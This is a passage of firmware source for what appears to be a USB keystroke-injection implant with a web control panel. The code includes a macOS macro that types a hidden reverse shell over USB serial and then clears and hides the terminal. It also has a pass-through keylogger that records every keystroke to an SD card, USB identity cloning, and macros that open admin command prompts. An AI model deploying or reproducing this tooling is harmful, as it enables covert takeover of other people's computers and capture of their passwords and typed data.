    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();

    // compressed payload
    Keyboard.println("sh -c 'D=$(ls -t /dev/cu.usbmodem* 2>/dev/null | head -n1) && exec 196<>$D; bash -i >&$D 0<&196 2>&196' &");

    // payload keyboard press event cleanup
    delay(100);
    Keyboard.releaseAll();

    // hide visible output on terminal
    Keyboard.println("clear");
    delay(100);
    Keyboard.releaseAll();

    // hide terminal (option+h)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("h");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("ShellMacCleanup")) {
    cmd.toCharArray(Command, cmd.length() + 1);

    delay(3000);

    // terminal cleanup - close tab

    // run spotlight/alfred prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();

    delay(1000);
    // type terminal
    Keyboard.print("terminal");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // cloease tab - option + w
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("w");
    delay(100);
    Keyboard.releaseAll();

    // enter, in case of alert window
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // hide terminal (option+h)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("h");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "AltF2") {
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "CtrlAltT") {
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "GuiR") {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "Gui") {
    Keyboard.press(KEY_LEFT_GUI);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "GuiSpace") {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "DetectOS") {
    onDetectOSRequested();
  }

  else if (cmd.startsWith("PrintLine ")) {
    Keyboard.println(cmd.c_str() + 10);
  }

  else if (cmd.startsWith("WinPrintLine ")) {
    writeLineWindows(cmd.c_str() + 13);
    delay(10);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("Print ")) {
    Keyboard.print(cmd.c_str() + 6);
  }

  else if (cmd.startsWith("WinPrint ")) {
    writeLineWindows(cmd.c_str() + 9);
  }

  else if (cmd.startsWith("Press ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 6;
    char key = tmp_key[0];
    cmd.remove(0, 6);

    if (keyMap.find(cmd) != keyMap.end()) {
      uint8_t keyCode = keyMap[cmd];
      Keyboard.press(keyCode);
    } else {
      uint8_t keyCode = (uint8_t)key;
      Keyboard.press(keyCode);
    }
  }

  else if (cmd.startsWith("PressRelease ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 13;
    char key = tmp_key[0];
    cmd.remove(0, 13);

    if (keyMap.find(cmd) != keyMap.end()) {
      uint8_t keyCode = keyMap[cmd];
      Keyboard.press(keyCode);
      delay(100);
      Keyboard.releaseAll();
    } else {
      uint8_t keyCode = (uint8_t)key;
      Keyboard.press(keyCode);
      delay(100);
      Keyboard.releaseAll();
    }
  }

  else if (cmd.startsWith("Release")) {
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("Delay ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(atoi(Command + 6));
  }

  else if (cmd.startsWith("RunPowershellAdmin")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("x");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("a");
    delay(3000);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("RunCmdAdmin")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("cmd");
    delay(2000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }
}

void handleUpdateWiFi() {
  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
    String newSSID = controlserver.arg("ssid");
    String newPassword = controlserver.arg("password");

    File fsUploadFile = SD.open("/wifi_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to open file for writing\"}");
      return;
    }

    fsUploadFile.println(newSSID);
    fsUploadFile.println(newPassword);
    fsUploadFile.close();
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config applied successfully! Device will restart.\"}");
    delay(1000);  // Give time for response to be sent
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
  }
}

void handleUpdateBackupWiFi() {
  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
    String ssid = controlserver.arg("ssid");
    String password = controlserver.arg("password");
    File file = SD.open("/wifi_backup_config.txt", FILE_WRITE);
    if (!file) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to save backup Wi-Fi config\"}");
      return;
    }
    file.println(ssid);
    file.println(password);
    file.close();
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Backup Wi-Fi config saved. Device will restart.\"}");
    delay(1000);
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
  }
}

void handleDeleteWiFiConfig() {
  if (SD.remove("/wifi_config.txt")) {
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config deleted successfully\"}");
    connectToWiFi();
  } else {
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete the file\"}");
  }
}

void handleUpdateVPN() {
  if (controlserver.hasArg("joincode")) {
    String newJoinCode = controlserver.arg("joincode");

    File fsUploadFile = SD.open("/vpn_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to open file for writing\"}");
      return;
    }

    fsUploadFile.println(newJoinCode);
    fsUploadFile.close();
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"VPN config applied successfully! Device will restart.\"}");
    delay(1000);
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing Join Code\"}");
  }
}

void handleDeleteVPNConfig() {
  if (SD.remove("/vpn_config.txt")) {
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"VPN config deleted successfully\"}");
    delay(1000);
    ESP.restart();
  } else {
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete the file\"}");
  }
}

void handleDeleteBackupWiFiConfig() {
  if (SD.remove("/wifi_backup_config.txt")) {
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Backup Wi-Fi config deleted successfully\"}");
    if (WiFi.status() != WL_CONNECTED) {
      connectToWiFi();
    }
  } else {
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete backup Wi-Fi config\"}");
  }
}

void handleUpdateUSB() {
  if (controlserver.hasArg("vendorID") && controlserver.hasArg("productID") && controlserver.hasArg("productName") && controlserver.hasArg("manufacturerName")) {

    String vendorID = controlserver.arg("vendorID");
    String productID = controlserver.arg("productID");
    String productName = controlserver.arg("productName");
    String manufacturerName = controlserver.arg("manufacturerName");

    File fsUploadFile = SD.open("/usb_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }

    fsUploadFile.println(vendorID);
    fsUploadFile.println(productID);
    fsUploadFile.println(productName);
    fsUploadFile.println(manufacturerName);
    fsUploadFile.close();
    controlserver.send(200, "text/plain", "USB config applied successfully! The device will restart.");
    ESP.restart();
  } else {
    controlserver.send(400, "text/plain", "Missing USB configuration data");
  }
}

void handleDeleteUSBConfig() {
  if (SD.exists("/usb_config.txt")) {
    if (SD.remove("/usb_config.txt")) {
      controlserver.send(200, "text/plain", "USB config deleted successfully");
      ESP.restart();
    } else {
      controlserver.send(500, "text/plain", "Failed to delete USB config file");
    }
  } else {
    controlserver.send(500, "text/plain", "USB config file does not exist");
  }
}

void handleLayout() {
  if (controlserver.hasArg("layout")) {
    String layout = controlserver.arg("layout");
    auto it = layoutMapInit.find(layout);

    if (it != layoutMapInit.end()) {
      selected_layout = it->second;
      Keyboard.setLayout(selected_layout);
      saveLayoutConfig(layout);
      controlserver.sendHeader("Cache-Control", "no-cache");
      controlserver.send(200, "text/plain", "Layout applied successfully!");
    } else {
      controlserver.send(400, "text/plain", "Invalid layout specified.");
    }
  } else {
    controlserver.send(400, "text/plain", "No layout specified.");
  }
}

void handleGetCurrentLayout() {
  String currentLayout = getCurrentLayout();
  controlserver.send(200, "text/plain", currentLayout);
}

void handleDeletePayload() {
  if (controlserver.hasArg("configmodule")) {
    String filenameToDelete = controlserver.arg("configmodule");
    if (filenameToDelete.length() > 0) {
      deleteFile(SD, filenameToDelete);
    } else {
      controlserver.send(400, "text/plain", "File name is empty");
    }
  } else {
    controlserver.send(400, "text/plain", "Missing file name");
  }
}

void handleDeleteAllPayloads() {
    JsonDocument doc;
    doc["success"] = false;
    doc["count"] = 0;
    JsonArray deletedFiles = doc["deleted_files"].to<JsonArray>();

    File root = SD.open("/payloads");
    if (!root || !root.isDirectory()) {
        doc["message"] = "No payloads found";
        controlserver.send(200, "application/json", doc.as<String>());
        return;
    }

    File file = root.openNextFile();
    while (file) {
        String fileName = file.name();
        file = root.openNextFile();

        if (fileName.endsWith(".meta")) {
            continue;
        }

        String filePath = "/payloads/" + fileName;
        if (SD.remove(filePath)) {
            doc["count"] = doc["count"].as<int>() + 1;
            deletedFiles.add(fileName);
            String metaPath = filePath + ".meta";
            SD.remove(metaPath);
        }
    }

    doc["success"] = true;
    doc["message"] = "Payloads deleted successfully";

    String jsonResponse;
    serializeJson(doc, jsonResponse);
    controlserver.send(200, "application/json", jsonResponse);
}

void enableUsbHost() {
  pinMode(21, OUTPUT);
  digitalWrite(21, LOW);
  delay(20);
  digitalWrite(21, HIGH);
}

const char* KeysChar(uint8_t key) {
  switch(key) {
    case 0x62: return "0"; // NumPad 0
    case 0x59: return "1"; // NumPad 1
    case 0x5A: return "2"; // NumPad 2
    case 0x5B: return "3"; // NumPad 3
    case 0x5C: return "4"; // NumPad 4
    case 0x5D: return "5"; // NumPad 5
    case 0x5E: return "6"; // NumPad 6
    case 0x5F: return "7"; // NumPad 7
    case 0x60: return "8"; // NumPad 8
    case 0x61: return "9"; // NumPad 9
    case 0x29: return " [ESC] "; // Esc
    case 0x3A: return " [F1] "; // F1
    case 0x3B: return " [F2] "; // F2
    case 0x3C: return " [F3] "; // F3
    case 0x3D: return " [F4] "; // F4
    case 0x3E: return " [F5] "; // F5
    case 0x3F: return " [F6] "; // F6
    case 0x40: return " [F7] "; // F7
    case 0x41: return " [F8] "; // F8
    case 0x42: return " [F9] "; // F9
    case 0x43: return " [F1O] "; // F10
    case 0x44: return " [F11] "; // F11
    case 0x45: return " [F12] "; // F12
    case 0x46: return " [PRINTSCREEN] "; // PrintScreen
    case 0x47: return " [SCROLLLOCK] "; // Scroll Lock
    case 0x48: return " [PAUSE] "; // Pause
    case 0x2A: return " [BACKSPACE] "; // Back Space
    case 0x49: return " [INSERT] "; // Insert
    case 0x4A: return " [HOME] "; // Home
    case 0x4B: return " [PAGEUP] "; // Page UP
    case 0x4E: return " [PAGEDOWN] "; // Page Down
    case 0x4C: return " [DELETE] "; // Delete
    case 0x4D: return " [END] "; // End
    case 0x52: return " [UP] "; // UP
    case 0x51: return " [DOWN] "; // DOWN
    case 0x50: return " [LEFT] "; // LEFT
    case 0x4F: return " [RIGHT] "; // RIGHT
    case 0x53: return " [NUMLOCK] "; // Num Lock
    case 0x54: return " [NUMPAD /] "; // NumPad /
    case 0x55: return " [NUMPAD *] "; // NumPad *
    case 0x56: return " [NUMPAD -] "; // NumPad -
    case 0x57: return " [NUMPAD +] "; // NumPad +
    case 0x63: return " [NUMPAD .] "; // NumPad .
    case 0x58: return " [NUMPADRETURN] "; // NumPad Return
    case 0x2B: return " [TAB] "; // TAB
    case 0x39: return " [CAPSLOCK] "; // Caps Lock
    case 0x65: return " [MENU] "; // Menu
    default: return nullptr;
  }
}

void logKeyToSD(const char *entry) {
  File logFile = SD.open("/log.txt", FILE_APPEND);
  if (logFile) {
    logFile.print(entry);
    logFile.close();
  }
}

char oemToAsciiLayout(const uint8_t *layout, uint8_t mod, uint8_t key) {
  bool shift = (mod & SHIFT) != 0;
  bool altgr = (mod & ALTGR) != 0; 

  for (uint8_t ascii = 32; ascii < 128; ascii++) {
    uint8_t entry = pgm_read_byte(&layout[ascii]); 
    uint8_t hid_key = entry & 0x3F;
    bool needs_shift = (entry & SHIFT) != 0;
    bool needs_altgr = (entry & ALTGR) != 0;

    if (hid_key == key && needs_shift == shift && needs_altgr == altgr) {
      return (char)ascii;
    }
  }
  return 0;
}

class KbdRptParser : public KeyboardReportParser {
  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);
    void OnKeyDown	(uint8_t mod, uint8_t key);
    void OnKeyUp	(uint8_t mod, uint8_t key);
};

static uint8_t       klHeldKey    = 0;
static uint8_t       klHeldMod    = 0;
static unsigned long klHeldSince  = 0;
static unsigned long klLastRepeat = 0;
#ifndef KEYLOG_REPEAT_DELAY_MS
#define KEYLOG_REPEAT_DELAY_MS    450
#endif
#ifndef KEYLOG_REPEAT_INTERVAL_MS
#define KEYLOG_REPEAT_INTERVAL_MS 40
#endif

String translateKeyToLog(uint8_t mod, uint8_t key) {
  bool s = (mod & 0x02) || (mod & 0x20);   // left or right shift
  bool a = (mod & 0x40);                    // right alt = AltGr
  bool shiftApply = s;
  bool isLetter = (key >= 0x04 && key <= 0x1D) || key == 0x33 || key == 0x31;
  if (isLetter && capsLock_status) shiftApply = !shiftApply;
  uint8_t level = a ? 2 : (shiftApply ? 1 : 0);
  const char* ex = keylogExtra(selected_layout, key, level);
  if (ex) return String(ex);
  char c = asciiFromLayout(selected_layout, key, shiftApply, a);
  if (c) { char buf[2] = { c, '\0' }; return String(buf); }
  const char* sp = KeysChar(key);
  if (sp) return String(sp);
  return String();
}

void keylogRepeatTick() {
  if (!klHeldKey) return;
  unsigned long now = millis();
  if (now - klHeldSince  < KEYLOG_REPEAT_DELAY_MS)    return;
  if (now - klLastRepeat < KEYLOG_REPEAT_INTERVAL_MS) return;
  klLastRepeat = now;
  if (klHeldKey == 40) { logKeyToSD(" [ENTER] "); logKeyToSD("\n"); return; }
  String t = translateKeyToLog(klHeldMod, klHeldKey);
  if (t.length()) logKeyToSD(t.c_str());
}

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) {
  if (!key) return;
  Keyboard.pressRaw(key);
  if (key == 0x39) capsLock_status = !capsLock_status;
  klHeldKey = key; klHeldMod = mod; klHeldSince = millis(); klLastRepeat = millis();

  if (key == 40) {               // Enter
    logKeyToSD(" [ENTER] ");
    logKeyToSD("\n");
    return;
  }
  String t = translateKeyToLog(mod, key);
  if (t.length()) logKeyToSD(t.c_str());
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
  MODIFIERKEYS beforeMod;
  *((uint8_t*)&beforeMod) = before;
  MODIFIERKEYS afterMod;
  *((uint8_t*)&afterMod) = after;

  leftctrl_status   = afterMod.bmLeftCtrl;
  leftshift_status  = afterMod.bmLeftShift;
  leftalt_status    = afterMod.bmLeftAlt;
  leftgui_status    = afterMod.bmLeftGUI;
  rightctrl_status  = afterMod.bmRightCtrl;
  rightshift_status = afterMod.bmRightShift;
  rightalt_status   = afterMod.bmRightAlt;
  rightgui_status   = afterMod.bmRightGUI;

  auto handleKey = [](bool beforeKey, bool afterKey, uint8_t rawCode, const char* name) {
    if (beforeKey != afterKey) {
      if (afterKey) {
        Keyboard.pressRaw(rawCode);
        logKeyToSD(name);
      } else {
        Keyboard.releaseRaw(rawCode);
      }
    }
  };

  handleKey(beforeMod.bmLeftCtrl,   afterMod.bmLeftCtrl,   0xE0, " [L-CTRL] ");
  handleKey(beforeMod.bmLeftShift,  afterMod.bmLeftShift,  0xE1, " [L-SHIFT] ");
  handleKey(beforeMod.bmLeftAlt,    afterMod.bmLeftAlt,    0xE2, " [L-ALT] ");
  handleKey(beforeMod.bmLeftGUI,    afterMod.bmLeftGUI,    0xE3, " [GUI] ");
  handleKey(beforeMod.bmRightCtrl,  afterMod.bmRightCtrl,  0xE4, " [R-CTRL] ");
  handleKey(beforeMod.bmRightShift, afterMod.bmRightShift, 0xE5, " [R-SHIFT] ");
  handleKey(beforeMod.bmRightAlt,   afterMod.bmRightAlt,   0xE6, " [ALTGR] ");
  handleKey(beforeMod.bmRightGUI,   afterMod.bmRightGUI,   0xE7, " [R-GUI] ");
}


void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
  if (key) Keyboard.releaseRaw(key);
  if (key == klHeldKey) klHeldKey = 0;   // stop auto-repeat in the log
}

USBHost     UsbHost;
USBHub     Hub(&UsbHost);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&UsbHost);
KbdRptParser Prs;

void serveSdFile(const char* path, const char* contentType) {
  File f = SD.open(path, FILE_READ);
  if (!f || f.isDirectory()) {
    if (f) f.close();
    controlserver.send(404, "text/plain", "File not found on microSD");
    return;
  }
  controlserver.streamFile(f, contentType);
  f.close();
}

void setup() {
  sdspi.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_SS);
  if (!SD.begin(SD_SS, sdspi)) {
    delay(1000);
    ESP.restart();
  }

  if (!SD.exists("/payloads")) {
    SD.mkdir("/payloads");
  }

  eccSapsanBegin();

  if (SD.exists("/usb_config.txt")) {
    File fsUploadFile = SD.open("/usb_config.txt", FILE_READ);
    if (fsUploadFile) {
      String vendorID = fsUploadFile.readStringUntil('\n');       vendorID.trim();
      String productID = fsUploadFile.readStringUntil('\n');      productID.trim();
      String productName = fsUploadFile.readStringUntil('\n');    productName.trim();
      String manufacturerName = fsUploadFile.readStringUntil('\n'); manufacturerName.trim();
      fsUploadFile.close();
      if (vendorID.length())  g_usbVid = (uint16_t) strtol(vendorID.c_str(), nullptr, 16);
      if (productID.length()) g_usbPid = (uint16_t) strtol(productID.c_str(), nullptr, 16);
      if (productName.length())      g_usbProduct      = productName;
      if (manufacturerName.length()) g_usbManufacturer = manufacturerName;
    }
  }

  EclUsbConfig ucfg;
  ucfg.vid          = g_usbVid;
  ucfg.pid          = g_usbPid;
  ucfg.manufacturer = g_usbManufacturer.c_str();
  ucfg.product      = g_usbProduct.c_str();
  eccUsbCloneApply(ucfg);
  Usb.setConfig(ucfg);
  Keyboard.onLedReport(onKeyboardLeds);
  Keyboard.begin();
  eccUsbNetBegin();
  eccUsbSerialBegin();
  Usb.begin();
  SPI.begin(12, 13, 11, 10);
  enableUsbHost();
  if (UsbHost.Init() == -1) {
    //USBSerial.println("OSC did not start.");
  }
  HidKeyboard.SetReportParser(0, &Prs);

  if (SD.exists("/layout_config.txt")) {
    File fsUploadFile = SD.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      String layoutKey = fsUploadFile.readStringUntil('\n');
      layoutKey.trim();
      fsUploadFile.close();
      auto it = layoutMapInit.find(layoutKey);
      if (it != layoutMapInit.end()) {
        selected_layout = it->second;
      }
    }
  }
  Keyboard.setLayout(selected_layout);

  if (SD.exists("/payloads/payload-startup.txt")) {
    File fsUploadFile = SD.open("/payloads/payload-startup.txt", FILE_READ);
    if (fsUploadFile) {
      livepayload = fsUploadFile.readString();
      setLayoutFromPayload(livepayload);
      payload_state = 1;
      payloadExecuted = false;
    }
  }

  connectToWiFi();
  initVPN();
  eccUsbNetApplyRuntime();

  {
    File root = SD.open("/payloads/");
    if (root && root.isDirectory()) {
      File file = root.openNextFile();
      while (file) {
        String fileName = file.name();
        //size_t fileSize = file.size();
        file = root.openNextFile();
      }
    }
  }

  delay(3000);

  controlserver.on("/", []() {
    serveSdFile("/HTML/index.html", "text/html");
  });

  controlserver.on("/stats", handleStats);

  controlserver.on("/connectioncheck", []() {
      controlserver.send(200, "application/json", "{\"status\":\"ok\"}");
  });

  controlserver.on("/livepayload", []() {
    serveSdFile("/HTML/livepayload.html", "text/html");
  });

  controlserver.on("/uploadpayload", []() {
    serveSdFile("/HTML/uploadpayload.html", "text/html");
  });

  controlserver.on("/config", []() {
    serveSdFile("/HTML/config.html", "text/html");
  });

  controlserver.on("/viewlog", []() {
    serveSdFile("/HTML/viewlog.html", "text/html");
  });

  controlserver.on("/logs", HTTP_GET, []() {
    if (SD.exists("/log.txt")) {
      File logFile = SD.open("/log.txt", FILE_READ);
      controlserver.streamFile(logFile, "text/plain");
      logFile.close();
    } else {
      controlserver.send(404, "text/plain", "Log file not found");
    }
  });

  controlserver.on("/delete", HTTP_POST, []() {
    if (SD.exists("/log.txt")) {
      if (SD.remove("/log.txt")) {
        controlserver.send(200, "application/json", "{\"status\":\"success\"}");
      } else {
        controlserver.send(500, "application/json", "{\"status\":\"error\", \"message\":\"Log file failed to delete\"}");
      }
    } else {
      controlserver.send(404, "application/json", "{\"status\":\"error\", \"message\":\"Log file not found\"}");
    }
  });

  controlserver.on(
    "/upload", HTTP_POST, []() {
      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"File uploaded successfully\"}");
    },
    handleFileUpload);

  controlserver.on("/listpayloads", []() {
    listDir(SD, "/payloads", 0);
    controlserver.send(200, "text/html", FileList);
  });

  controlserver.on("/showpayload", []() {
    String fileName = controlserver.arg("payload");
    readFile(SD, fileName);
    controlserver.send(200, "text/html", FileList);
  });

  controlserver.on("/style.css", []() {
    // Set aggressive caching for CSS
    controlserver.sendHeader("Cache-Control", "public, max-age=1728000");   // Cache for 20 days
    controlserver.sendHeader("ETag", "\"v1.0\"");                           // Add ETag for cache validation
    serveSdFile("/HTML/style.css", "text/css");
  });

  controlserver.on("/javascript.js", []() {
    // Set aggressive caching for JavaScript
    controlserver.sendHeader("Cache-Control", "public, max-age=1728000");  // Cache for 20 days
    controlserver.sendHeader("ETag", "\"v1.0\"");                           // Add ETag for cache validation
    serveSdFile("/HTML/javascript.js", "application/javascript");
  });

  controlserver.on("/reboot", HTTP_POST, []() {
      controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Device rebooting\"}");
      controlserver.client().setNoDelay(true);
      delay(100);
      controlserver.client().stop();
      delay(100);
      ESP.restart();
  });

  controlserver.on("/dopayload", []() {
    if (livepayload != "") {
      payload_state = 1;
      payloadExecuted = false;
    }
    controlserver.send(200, "text/plain", "Payload running...");
  });

  controlserver.on("/runlivepayload", []() {
    livepayload = controlserver.arg("livepayload");
    if (controlserver.arg("configmodule")) {
      payload_state = 1;
      payloadExecuted = false;
    }
    controlserver.send(200, "text/plain", "Payload running...");
  });

  controlserver.on("/runlivestartup", []() {
    String payload_startup = controlserver.arg("livepayload");
    String fileName = "payload-startup.txt";
    String filePath = "/payloads/" + fileName;

    if (!SD.exists("/payloads")) {
      SD.mkdir("/payloads");
    }

    File fsUploadFile = SD.open(filePath, FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }

    fsUploadFile.print(payload_startup);
    fsUploadFile.close();
    setLayoutFromPayload(payload_startup);
    payloadExecuted = true;
    controlserver.send(200, "text/plain", "Payload saved");
  });

  controlserver.on("/runlivesave", HTTP_POST, []() {
    String payload_save = controlserver.arg("livepayload");
    String payloadName = controlserver.arg("payloadName");
    String payloadDesc = controlserver.arg("payloadDescription");
    String payloadOS = controlserver.arg("payloadOS");
    String fileName;
    setLayoutFromPayload(payload_save);

    int namePos = payload_save.indexOf("# Name: ");
    if (namePos != -1) {
      int start = namePos + 8;
      int end = payload_save.indexOf('\n', start);
      if (end == -1) {
        end = payload_save.length();
      }
      fileName = payload_save.substring(start, end);
      fileName.trim();
    }

    if (fileName.length() == 0 || fileName.indexOf('/') != -1) {
      const char charset[] = "abcdefghijklmnopqrstuvwxyz1234567890";
      fileName = "livepayload-";
      for (int i = 0; i < 8; i++) {
        fileName += charset[random(0, 26)];
      }
      fileName += ".txt";
    }

    String filePath = "/payloads/" + fileName;

    if (!SD.exists("/payloads")) {
      SD.mkdir("/payloads");
    }

    File fsUploadFile = SD.open(filePath, FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }
    fsUploadFile.print(payload_save);
    fsUploadFile.close();

    // Save metadata
    savePayloadMetadata(filePath, payloadName, payloadDesc, payloadOS);

    payloadExecuted = true;
    controlserver.send(200, "text/plain", "Payload saved");
  });

  controlserver.on("/payloadstatuspayload", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/payloadstatusstartup", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/payloadstatussave", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/autoexecplanning", []() {
    serveSdFile("/HTML/autoexecplanning.html", "text/html");
  });

  controlserver.on("/listpayloadsdata", []() {
    JsonDocument doc;
    JsonArray payloads = doc.to<JsonArray>();

    File root = SD.open("/payloads/");
    if (root && root.isDirectory()) {
      File file = root.openNextFile();
      while (file) {
        String fileName = file.name();
        if (!fileName.endsWith(".meta")) {
          String filePath = "/payloads/" + fileName;
          String payloadName = readPayloadMetadata(filePath, META_NAME);
          String payloadDesc = readPayloadMetadata(filePath, META_DESCRIPTION);

          JsonObject payload = payloads.add<JsonObject>();
          payload["path"] = filePath;
          payload["name"] = payloadName;
          payload["description"] = payloadDesc;
          payload["filename"] = fileName;
        }
        file = root.openNextFile();
      }
    }

    String output;
    serializeJson(doc, output);
    controlserver.send(200, "application/json", output);
  });

  controlserver.on("/saveautoexecplan", HTTP_POST, []() {
    String payload = controlserver.arg("plain");
    JsonDocument doc;
    deserializeJson(doc, payload);

    File file = SD.open("/autoexec_plan.json", FILE_WRITE);
    if (!file) {
      controlserver.send(500, "application/json", "{\"success\":false}");
      return;
    }

    serializeJson(doc, file);
    file.close();
    controlserver.send(200, "application/json", "{\"success\":true}");
  });

  controlserver.on("/getautoexecplan", []() {
    if (!SD.exists("/autoexec_plan.json")) {
      controlserver.send(200, "application/json", "{}");
      return;
    }

    File file = SD.open("/autoexec_plan.json", FILE_READ);
    if (!file) {
      controlserver.send(500, "application/json", "{}");
      return;
    }

    String content = file.readString();
    file.close();
    controlserver.send(200, "application/json", content);
  });

  controlserver.on("/clearautoexecplan", HTTP_POST, []() {
    if (SD.exists("/autoexec_plan.json")) {
      SD.remove("/autoexec_plan.json");
    }
    controlserver.send(200, "application/json", "{\"success\":true}");
  });

  controlserver.on("/updatepayload", HTTP_POST, []() {
    if (controlserver.hasArg("plain")) {  // Check for JSON data
      String payload = controlserver.arg("plain");
      JsonDocument doc;
      deserializeJson(doc, payload);

      String path = doc["path"].as<String>();
      String content = doc["content"].as<String>();

      if (path.length() > 0 && content.length() > 0) {
        File file = SD.open(path, FILE_WRITE);
        if (!file) {
          controlserver.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to open file for writing\"}");
          return;
        }

        file.print(content);
        file.close();

        // Update layout if specified in payload
        setLayoutFromPayload(content);

        controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Payload updated successfully\"}");
      } else {
        controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"Missing path or content parameters\"}");
      }
    } else {
      controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"No data received\"}");
    }
  });

  controlserver.on("/updatewifi", HTTP_POST, handleUpdateWiFi);
  controlserver.on("/layout", HTTP_POST, handleLayout);
  controlserver.on("/deletewificonfig", HTTP_POST, handleDeleteWiFiConfig);
  controlserver.on("/updatevpn", HTTP_POST, handleUpdateVPN);
  controlserver.on("/deletevpnconfig", HTTP_POST, handleDeleteVPNConfig);
  controlserver.on("/updateusb", HTTP_POST, handleUpdateUSB);

  controlserver.on("/usbhost/scan", HTTP_POST, [](){
    bool ok = eccUsbCloneScan(&UsbHost, HidKeyboard.GetAddress());
    if (ok) controlserver.send(200, "application/json", eccUsbCloneInfoJson());
    else    controlserver.send(200, "application/json",
              "{\"valid\":false,\"error\":\"No USB keyboard detected on the host port\"}");
  });
  controlserver.on("/usbhost/info", HTTP_GET, [](){
    controlserver.send(200, "application/json", eccUsbCloneInfoJson());
  });
  controlserver.on("/usbhost/autoclone", HTTP_POST, [](){
